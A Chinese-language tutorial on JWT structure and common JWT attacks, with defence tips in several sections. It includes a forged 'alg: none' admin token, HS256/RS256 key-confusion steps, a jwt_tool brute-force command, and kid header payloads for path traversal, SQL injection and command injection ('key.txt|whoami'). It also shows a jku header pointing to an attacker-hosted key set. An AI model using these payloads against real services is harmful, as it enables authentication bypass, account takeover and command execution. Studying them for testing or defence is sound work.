<h3 class="md-end-block md-heading"><span class="md-plain">一、JWT 基础认知</span></h3>
<h4 class="md-end-block md-heading"><span class="md-plain">1. 定义与结构</span></h4>
<p class="md-end-block md-p"><span class="md-plain">JSON Web Token（JWT）是一种基于 JSON 的轻量级身份验证令牌，用于在客户端与服务端之间安全传递声明信息，常见于单点登录（SSO）场景。</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">结构组成：由 3 部分通过</span><span class="md-pair-s" spellcheck="false"><code>.</code></span><span class="md-plain">拼接，分别为：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">Header（头部）</span></strong></span><span class="md-plain">：Base64 编码的 JSON，包含令牌类型（</span><span class="md-pair-s" spellcheck="false"><code>typ: &quot;JWT&quot;</code></span><span class="md-plain">）和签名算法（</span><span class="md-pair-s" spellcheck="false"><code>alg: &quot;HS256&quot;</code></span><span class="md-plain">等）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">Payload（负载）</span></strong></span><span class="md-plain">：Base64 编码的 JSON，存储用户 ID、权限、过期时间等核心数据（如</span><span class="md-pair-s" spellcheck="false"><code>{&quot;user&quot;: &quot;admin&quot;, &quot;exp&quot;: 1620000000}</code></span><span class="md-plain">）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">Signature（签名）</span></strong></span><span class="md-plain">：通过 Header 指定的算法，对</span><span class="md-pair-s" spellcheck="false"><code>Header.Base64 + &quot;.&quot; + Payload.Base64</code></span><span class="md-plain">与密钥计算得出的哈希值，用于验证令牌完整性。</span></p>
</li>
</ul>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">二、核心攻击方式</span></h3>
<h4 class="md-end-block md-heading md-focus"><span class="md-plain">1. 敏感信息泄露</span></h4>
<h5 class="md-end-block md-heading"><span class="md-plain">原理</span></h5>
<p class="md-end-block md-p"><span class="md-plain">Header 和 Payload 采用</span><span class="md-pair-s "><strong><span class="md-plain">可逆的 Base64URL 编码</span></strong></span><span class="md-plain">（非加密），任何人获取令牌后均可解码读取内容，若包含密码、密钥等敏感数据将直接泄露。</span></p>

<h5 class="md-end-block md-heading"><span class="md-plain">利用方法</span></h5>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s"><strong><span class="md-plain">解码工具</span></strong></span><span class="md-plain">：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">Linux：</span><span class="md-pair-s" spellcheck="false"><code>echo &quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9&quot; | base64 -d</code></span> <span class="md-plain">（输出：</span><span class="md-pair-s" spellcheck="false"><code>{&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;HS256&quot;}</code></span><span class="md-plain">）</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">浏览器控制台：</span><span class="md-pair-s" spellcheck="false"><code>atob(&quot;eyJ1c2VyIjoiYWRtaW4ifQ&quot;)</code></span> <span class="md-plain">（输出：</span><span class="md-pair-s" spellcheck="false"><code>{&quot;user&quot;:&quot;admin&quot;}</code></span><span class="md-plain">）</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">Python：</span></p>



```python
import base64
print(base64.b64decode("eyJ1c2VyIjoiYWRtaW4ifQ".encode()).decode())
```


</li>
</ul>
</li>
</ul>
<h5 class="md-end-block md-heading"><span class="md-plain">风险案例</span></h5>
<p class="md-end-block md-p"><span class="md-plain">某网站在 Payload 中包含用户明文密码，攻击者截获令牌后直接解码获取，进而登录用户账户。</span></p>

<h4 class="md-end-block md-heading"><span class="md-plain">2. 算法置空攻击（alg: none）</span></h4>
<h5 class="md-end-block md-heading"><span class="md-plain">原理</span></h5>
<p class="md-end-block md-p"><span class="md-plain">JWT 协议支持将签名算法设为</span><span class="md-pair-s" spellcheck="false"><code>&quot;none&quot;</code></span><span class="md-plain">，此时签名字段为空（仅保留</span><span class="md-pair-s" spellcheck="false"><code>.</code></span><span class="md-plain">），服务端若未禁用该配置，会跳过签名验证，直接信任令牌内容。</span></p>

<h5 class="md-end-block md-heading"><span class="md-plain">利用步骤</span></h5>
<ol class="ol-list">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">获取原始令牌</span></strong></span><span class="md-plain">：</span> <span class="md-plain">例如：</span><span class="md-pair-s" spellcheck="false"><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</code></span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">修改 Header 算法为</span><span class="md-pair-s" spellcheck="false"><code>none</code></span></strong></span><span class="md-plain">：</span> <span class="md-plain">解码 Header 并改为</span><span class="md-pair-s" spellcheck="false"><code>{&quot;alg&quot;: &quot;none&quot;, &quot;typ&quot;: &quot;JWT&quot;}</code></span><span class="md-plain">，重新 Base64 编码为：</span><span class="md-pair-s" spellcheck="false"><code>eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0</code></span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">删除签名部分</span></strong></span><span class="md-plain">：</span> <span class="md-plain">最终伪造令牌：</span><span class="md-pair-s" spellcheck="false"><code>eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.</code></span><span class="md-plain">（末尾保留</span><span class="md-pair-s" spellcheck="false"><code>.</code></span><span class="md-plain">）</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">发送请求</span></strong></span><span class="md-plain">：若服务端接受该令牌并返回管理员权限页面，则漏洞存在。</span></p>
</li>
</ol>
<h5 class="md-end-block md-heading"><span class="md-plain">防御建议</span></h5>
<p class="md-end-block md-p"><span class="md-plain">服务端配置中明确指定允许的签名算法（如仅支持</span><span class="md-pair-s" spellcheck="false"><code>HS256</code></span><span class="md-plain">），禁止</span><span class="md-pair-s" spellcheck="false"><code>&quot;none&quot;</code></span><span class="md-plain">算法。</span></p>

<h4 class="md-end-block md-heading"><span class="md-plain">3. 密钥混淆攻击（HS256 vs RS256）</span></h4>
<h5 class="md-end-block md-heading"><span class="md-plain">原理</span></h5>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">HS256</span></strong></span><span class="md-plain">：对称加密算法，使用同一密钥进行签名和验证。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">RS256</span></strong></span><span class="md-plain">：非对称加密算法，使用私钥签名、公钥验证。</span> <span class="md-plain">若服务端同时支持两种算法，攻击者可将</span><span class="md-pair-s" spellcheck="false"><code>alg</code></span><span class="md-plain">从</span><span class="md-pair-s" spellcheck="false"><code>RS256</code></span><span class="md-plain">改为</span><span class="md-pair-s" spellcheck="false"><code>HS256</code></span><span class="md-plain">，诱使服务端用</span><span class="md-pair-s "><strong><span class="md-plain">公钥作为 HS256 的密钥</span></strong></span><span class="md-plain">验证签名（公钥通常可公开获取）。</span></p>
</li>
</ul>
<h5 class="md-end-block md-heading"><span class="md-plain">利用步骤</span></h5>
<ol class="ol-list">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s"><strong><span class="md-plain">获取公钥</span></strong></span><span class="md-plain">：通过目标网站的</span><span class="md-pair-s" spellcheck="false"><code>/.well-known/jwks.json</code></span><span class="md-plain">或证书文件提取公钥（如</span><span class="md-pair-s" spellcheck="false"><code>public.pem</code></span><span class="md-plain">）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s"><strong><span class="md-plain">构造恶意令牌</span></strong></span><span class="md-plain">：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">修改 Header 的</span><span class="md-pair-s" spellcheck="false"><code>alg</code></span><span class="md-plain">为</span><span class="md-pair-s" spellcheck="false"><code>HS256</code></span><span class="md-plain">。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">用获取的公钥作为密钥，对修改后的 Header 和 Payload 进行 HS256 签名。</span></p>
</li>
</ul>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">发送请求</span></strong></span><span class="md-plain">：服务端若用公钥验证 HS256 签名，将认可伪造的令牌。</span></p>
</li>
</ol>
<h5 class="md-end-block md-heading"><span class="md-plain">防御建议</span></h5>
<p class="md-end-block md-p"><span class="md-plain">服务端仅启用一种加密算法（如纯 RS256），并严格校验算法类型，拒绝非预期算法。</span></p>

<h4 class="md-end-block md-heading"><span class="md-plain">4. 无效签名绕过</span></h4>
<h5 class="md-end-block md-heading"><span class="md-plain">原理</span></h5>
<p class="md-end-block md-p"><span class="md-plain">服务端未严格验证签名（如代码中省略签名校验步骤），攻击者可直接修改 Payload（如将</span><span class="md-pair-s" spellcheck="false"><code>user: &quot;test&quot;</code></span><span class="md-plain">改为</span><span class="md-pair-s" spellcheck="false"><code>user: &quot;admin&quot;</code></span><span class="md-plain">），无需重新签名即可通过验证。</span></p>

<h5 class="md-end-block md-heading"><span class="md-plain">利用案例</span></h5>
<p class="md-end-block md-p"><span class="md-plain">某网站 “个人资料页” 的访问控制依赖 JWT 中的</span><span class="md-pair-s" spellcheck="false"><code>user</code></span><span class="md-plain">字段，攻击者截获令牌后：</span></p>

<ol class="ol-list">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">解码 Payload 并修改</span><span class="md-pair-s" spellcheck="false"><code>user</code></span><span class="md-plain">为</span><span class="md-pair-s" spellcheck="false"><code>&quot;admin&quot;</code></span><span class="md-plain">，重新 Base64 编码。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">保持原始签名不变（或随意修改），发送请求后成功访问管理员资料页。</span></p>
</li>
</ol>
<h4 class="md-end-block md-heading"><span class="md-plain">5. 暴力破解密钥（针对 HMAC 算法）</span></h4>
<h5 class="md-end-block md-heading"><span class="md-plain">原理</span></h5>
<p class="md-end-block md-p"><span class="md-plain">HS256/HS384 等对称算法的签名依赖密钥，若密钥强度低（如弱密码），可通过字典攻击离线破解。</span></p>

<h5 class="md-end-block md-heading"><span class="md-plain">利用工具与命令</span></h5>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s"><strong><span class="md-plain">jwt_tool</span></strong></span><span class="md-plain">（主流 JWT 测试工具）：</span></p>



```bash
# 用字典1.txt暴力破解密钥
python jwt_tool.py <目标令牌> -C -d 1.txt
# 示例输出：[+] 密钥匹配：abc123
```


</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s"><strong><span class="md-plain">破解成功后</span></strong></span><span class="md-plain">：用密钥伪造任意令牌（如将</span><span class="md-pair-s" spellcheck="false"><code>user</code></span><span class="md-plain">改为</span><span class="md-pair-s" spellcheck="false"><code>admin</code></span><span class="md-plain">，重新签名）。</span></p>
</li>
</ul>
<h4 class="md-end-block md-heading"><span class="md-plain">6. 密钥泄露</span></h4>
<h5 class="md-end-block md-heading"><span class="md-plain">原理</span></h5>
<p class="md-end-block md-p"><span class="md-plain">攻击者通过其他漏洞获取签名密钥（如 Git 信息泄露、目录遍历、XXE 等），直接伪造合法令牌。</span></p>

<h5 class="md-end-block md-heading"><span class="md-plain">常见泄露场景</span></h5>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">代码仓库泄露：</span><span class="md-pair-s" spellcheck="false"><code>.git</code></span><span class="md-plain">目录中遗留</span><span class="md-pair-s" spellcheck="false"><code>jwt_secret.key</code></span><span class="md-plain">文件。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">任意文件读取：通过</span><span class="md-pair-s" spellcheck="false"><code>../../etc/jwt/secret</code></span><span class="md-plain">路径读取密钥。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">XXE 漏洞：利用 XML 外部实体注入读取密钥文件。</span></p>
</li>
</ul>
<h4 class="md-end-block md-heading"><span class="md-plain">7. KID 参数操纵</span></h4>
<h5 class="md-end-block md-heading"><span class="md-plain">原理</span></h5>
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>kid</code></span><span class="md-plain">（Key ID）是 Header 中的可选字段，用于指定验证密钥（如从文件系统或数据库中检索），若未过滤用户输入，可引发多种攻击。</span></p>

<h5 class="md-end-block md-heading"><span class="md-plain">具体利用</span></h5>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">目录遍历</span></strong></span><span class="md-plain">：</span> <span class="md-plain">构造</span><span class="md-pair-s" spellcheck="false"><code>&quot;kid&quot;: &quot;../../../etc/passwd&quot;</code></span><span class="md-plain">，使服务端用系统文件</span><span class="md-pair-s" spellcheck="false"><code>/etc/passwd</code></span><span class="md-plain">作为验证密钥，攻击者用该文件内容签名令牌。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">SQL 注入</span></strong></span><span class="md-plain">：</span> <span class="md-plain">若</span><span class="md-pair-s" spellcheck="false"><code>kid</code></span><span class="md-plain">用于数据库查询（如</span><span class="md-pair-s" spellcheck="false"><code>SELECT key FROM keys WHERE id = &#039;${kid}&#039;</code></span><span class="md-plain">），可注入：</span> <span class="md-pair-s" spellcheck="false"><code>&quot;kid&quot;: &quot;1&#039; UNION SELECT &#039;my_secret&#039;;--&quot;</code></span><span class="md-plain">，使服务端用</span><span class="md-pair-s" spellcheck="false"><code>my_secret</code></span><span class="md-plain">作为密钥。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">命令注入</span></strong></span><span class="md-plain">：</span> <span class="md-plain">若</span><span class="md-pair-s" spellcheck="false"><code>kid</code></span><span class="md-plain">传入文件读取函数（如 Ruby 的</span><span class="md-pair-s" spellcheck="false"><code>open()</code></span><span class="md-plain">），可构造：</span> <span class="md-pair-s" spellcheck="false"><code>&quot;kid&quot;: &quot;key.txt|whoami&quot;</code></span><span class="md-plain">，执行系统命令并返回结果。</span></p>
</li>
</ul>
<h4 class="md-end-block md-heading"><span class="md-plain">8. 头部参数操纵（JKU/JWK/X5U）</span></h4>
<h5 class="md-end-block md-heading"><span class="md-plain">原理</span></h5>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">JKU（JWK Set URL）</span></strong></span><span class="md-plain">：指定包含验证密钥的 URL，服务端会自动下载并使用该 URL 中的密钥。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">JWK（JSON Web Key）</span></strong></span><span class="md-plain">：直接在 Header 中嵌入验证密钥。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">X5U/X5C</span></strong></span><span class="md-plain">：指定包含公钥证书的 URL 或嵌入证书内容。</span></p>
</li>
</ul>
<h5 class="md-end-block md-heading"><span class="md-plain">利用步骤</span></h5>
<ol class="ol-list">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">托管恶意密钥</span></strong></span><span class="md-plain">：攻击者在自己的服务器上放置恶意 JWK 文件（如</span><span class="md-pair-s" spellcheck="false"><code>https://attacker.com/jwks.json</code></span><span class="md-plain">）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">构造令牌</span></strong></span><span class="md-plain">：Header 中设置</span><span class="md-pair-s" spellcheck="false"><code>&quot;jku&quot;: &quot;https://attacker.com/jwks.json&quot;</code></span><span class="md-plain">。</span></p>
</li>
 	<li class="md-list-item md-focus-container">
<p class="md-end-block md-p md-focus"><span class="md-pair-s "><strong><span class="md-plain">发送请求</span></strong></span><span class="md-plain md-expand">：服务端下载并使用恶意密钥验证，认可伪造的令牌。</span></p>
</li>
</ol>
